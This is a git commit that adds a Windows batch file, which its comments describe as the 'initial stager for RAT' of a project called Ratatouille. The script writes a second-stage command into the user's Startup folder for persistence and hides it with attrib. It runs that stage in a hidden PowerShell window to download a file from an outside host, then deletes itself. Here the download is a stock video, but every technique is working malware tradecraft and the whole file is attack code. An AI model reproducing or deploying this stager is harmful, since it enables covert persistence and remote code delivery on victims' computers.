27d263053b9cff2176cabe0241558154ea5d5f94
CHEPHYTY <soumyahembra123@gmail.com>
2024-05-17 20:04:03 +0530

    initial development of the software Ratatouille

---
+++ initial.cmd
@@ -0,0 +1,28 @@
+@echo off
+@REM initial stager for RAT 
+@REM created by :CHEPHYTY
+@REM move into startup directory
+
+@REM variables 
+@REM INITIALPATH capture the current path of the dir
+set "INITIALPATH=%cd%" 
+@REM  STARTUP capture the path of the microsoft startup file
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+@REM move into startup directory
+cd /d "%STARTUP%"
+
+@REM write payloads to startup
+(echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > stage2.cmd
+
+@REM hide the stage2.cmd file
+attrib +h stage2.cmd
+
+@REM run payload 
+powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\stage2.cmd' -WindowStyle Hidden"
+
+@REM cd back into initial location
+cd /d "%INITIALPATH%"
+
+@REM self-delete without error message
+start /b "" cmd /c del "%~f0"&exit
